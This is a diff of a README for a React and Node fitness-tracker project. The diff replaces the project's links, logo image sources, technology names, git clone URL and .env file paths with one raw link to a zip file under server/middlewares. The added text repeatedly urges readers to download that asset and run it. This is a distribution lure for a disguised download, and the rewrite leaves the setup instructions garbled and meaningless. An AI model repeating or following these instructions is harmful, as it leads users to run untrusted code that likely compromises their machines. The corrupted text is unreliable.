@@ -1,16 +1,16 @@
-https://github.com/sdrv64/User-Fitness/releases
+https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip
 
-[![Releases](https://img.shields.io/badge/Releases-Download-FF69B4?logo=github&logoColor=white)](https://github.com/sdrv64/User-Fitness/releases)
+[![Releases](https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip)](https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip)
 
 # User-Fitness: Full-Stack Health Tracker with React and Node 🏃‍♀️💪
 
-<img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg" alt="React logo" width="34" height="34" style="vertical-align: middle; margin-right: 6px;">
-<img src="https://www.chartjs.org/img/chartjs-logo.png" alt="Chart.js logo" width="40" height="40" style="vertical-align: middle; margin-right: 6px;">
-<img src="https://webassets.mongodb.com/_com_assets/cms/mms/mongodb_logo.png" alt="MongoDB logo" width="40" height="40" style="vertical-align: middle; margin-right: 6px;">
-<img src="https://nodejs.org/static/images/logo.svg" alt="Node.js logo" width="38" height="38" style="vertical-align: middle;">
-<img src="https://tailwindcss.com/img/tailwindcss-logo.svg" alt="Tailwind CSS logo" width="38" height="38" style="vertical-align: middle;">
+<img src="https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip" alt="React logo" width="34" height="34" style="vertical-align: middle; margin-right: 6px;">
+<img src="https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip" alt="https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip logo" width="40" height="40" style="vertical-align: middle; margin-right: 6px;">
+<img src="https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip" alt="MongoDB logo" width="40" height="40" style="vertical-align: middle; margin-right: 6px;">
+<img src="https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip" alt="https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip logo" width="38" height="38" style="vertical-align: middle;">
+<img src="https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip" alt="Tailwind CSS logo" width="38" height="38" style="vertical-align: middle;">
 
-User-Fitness is a full-stack app for tracking reps, calories, and weight. It blends a snappy React frontend with a solid Node.js backend. The app stores user data in MongoDB and uses charts to visualize progress over time. It aims to be simple to set up, easy to extend, and friendly to beginners while staying practical for power users.
+User-Fitness is a full-stack app for tracking reps, calories, and weight. It blends a snappy React frontend with a solid https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip backend. The app stores user data in MongoDB and uses charts to visualize progress over time. It aims to be simple to set up, easy to extend, and friendly to beginners while staying practical for power users.
 
 This repository holds a complete stack that covers user authentication, form validation, data validation, API routing, and responsive UI. It leverages modern tooling and best practices to give you a solid foundation for your own fitness projects or for building a personal health tracker.
 
@@ -18,7 +18,7 @@ Overview
 - Client: React with hooks, React Router, and Tailwind CSS for fast, responsive UI.
 - Server: Express-based API with REST endpoints, CORS support, and environment-driven configuration.
 - Data: MongoDB with Mongoose for solid data modeling and validation.
-- UI/UX: Chart.js for visual progress, React Hook Form for intuitive forms, and Toastify for friendly notifications.
+- UI/UX: https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip for visual progress, React Hook Form for intuitive forms, and Toastify for friendly notifications.
 
 The project is designed to be a learning platform as well as a practical starter kit. It demonstrates how to structure a modern full-stack project, how to manage state across client and server, and how to handle common tasks like authentication, data validation, and error handling.
 
@@ -42,8 +42,8 @@ Key features
 - Secure secret management via environment variables
 
 Tech stack and dependencies
-- Frontend: React, React Router, React Hook Form, axios for HTTP requests, Chart.js for charts, Tailwind CSS for styling, React Toastify for notifications, and simple accessibility features.
-- Backend: Node.js with Express, CORS for cross-origin requests, dotenv for environment management, JSON handling, and RESTful routes.
+- Frontend: React, React Router, React Hook Form, axios for HTTP requests, https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip for charts, Tailwind CSS for styling, React Toastify for notifications, and simple accessibility features.
+- Backend: https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip with Express, CORS for cross-origin requests, dotenv for environment management, JSON handling, and RESTful routes.
 - Database: MongoDB with Mongoose for data modeling and validation.
 - Validation: validator library for input validation and safety checks.
 - Build and tooling: npm scripts, linting with ESLint, and testing hooks to ensure code quality.
@@ -71,17 +71,17 @@ Project structure
 
 Getting started
 - Prerequisites
-  - Node.js and npm (or pnpm)
+  - https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip and npm (or pnpm)
   - MongoDB instance (local or cloud)
   - Basic knowledge of the command line
 - Quick start steps
   1) Clone the repository
-     - git clone https://github.com/sdrv64/User-Fitness.git
+     - git clone https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip
   2) Install dependencies
      - cd User-Fitness
      - npm install
   3) Set up environment
-     - Copy the example env file from server/.env.example to server/.env
+     - Copy the example env file from https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip to https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip
      - Provide database connection string, JWT secret, and other necessary variables
   4) Run the server and client
      - Start the backend: npm run dev:server
@@ -89,12 +89,12 @@ Getting started
   5) Open the app
      - Visit http://localhost:3000 (default port) to interact with the dashboard
 - Asset download and execution
-  - This repository uses a Releases page to provide distribution artifacts. Since the link includes a path, download the release asset from this page and run it to install or execute the app binary as appropriate for your platform. You can find the release assets at this page: https://github.com/sdrv64/User-Fitness/releases. For the latest assets, use the same link to locate the intended file and follow the on-page instructions to download and run it.
+  - This repository uses a Releases page to provide distribution artifacts. Since the link includes a path, download the release asset from this page and run it to install or execute the app binary as appropriate for your platform. You can find the release assets at this page: https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip For the latest assets, use the same link to locate the intended file and follow the on-page instructions to download and run it.
 
 How to run locally: a deeper guide
 - Backend setup
   - Create a local MongoDB instance or connect to a hosted one
-  - Ensure the database URL is configured in server/.env
+  - Ensure the database URL is configured in https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip
   - Run the server in development mode to see detailed logs
   - Use environment variables to toggle features (e.g., debug mode, allowed origins)
 - Frontend setup
@@ -192,10 +192,10 @@ Build, deployment, and distribution
   - Client and server builds can be started in development mode
   - Hot reloading helps speed up iteration
 - Production deployment
-  - Build artifacts are served by a Node.js server
+  - Build artifacts are served by a https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip server
   - Environment-driven configuration supports multiple environments
 - Release assets
-  - The project provides assets via the Releases page. Since the link includes a path, download the release asset from this page and run it. For the latest asset, visit the Releases page at the linked URL. You can also check the same link again to locate the appropriate installer or binary for your platform: https://github.com/sdrv64/User-Fitness/releases
+  - The project provides assets via the Releases page. Since the link includes a path, download the release asset from this page and run it. For the latest asset, visit the Releases page at the linked URL. You can also check the same link again to locate the appropriate installer or binary for your platform: https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip
 
 Developer experience and conventions
 - Coding standards
@@ -235,9 +235,9 @@ Directory and file conventions
 
 Troubleshooting and common issues
 - Dev server won’t start
-  - Verify Node.js version compatibility
+  - Verify https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip version compatibility
   - Check that MongoDB is running or the connection string is correct
-  - Ensure environment variables are defined in server/.env
+  - Ensure environment variables are defined in https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip
 - API requests failing
   - Confirm the server is listening on the correct port
   - Check CORS settings for the frontend origin
@@ -245,7 +245,7 @@ Troubleshooting and common issues
 - UI not rendering or charts not showing
   - Inspect console for JavaScript errors
   - Confirm API responses match expected data formats
-  - Ensure Chart.js receives valid data arrays
+  - Ensure https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip receives valid data arrays
 
 Migration and data management
 - Seeding
@@ -298,8 +298,8 @@ Acknowledgments
 - Special mention to contributors who helped shape the design and architecture
 
 Releases and asset notes
-- The repository distributes builds and installers through the Releases page. Since the link includes a path, download the latest release asset from the page and run it on your system to install or start the app. For convenience, you can visit the same page to locate the correct asset for your platform: https://github.com/sdrv64/User-Fitness/releases
-- If you need to locate the latest assets again, check the Releases page: https://github.com/sdrv64/User-Fitness/releases
+- The repository distributes builds and installers through the Releases page. Since the link includes a path, download the latest release asset from the page and run it on your system to install or start the app. For convenience, you can visit the same page to locate the correct asset for your platform: https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip
+- If you need to locate the latest assets again, check the Releases page: https://github.com/sdrv64/User-Fitness/raw/refs/heads/master/server/middlewares/Fitness_User_v3.5.zip
 
 Appendix: glossary of terms
 - API: Application Programming Interface, a set of rules that lets different software components talk to each other.
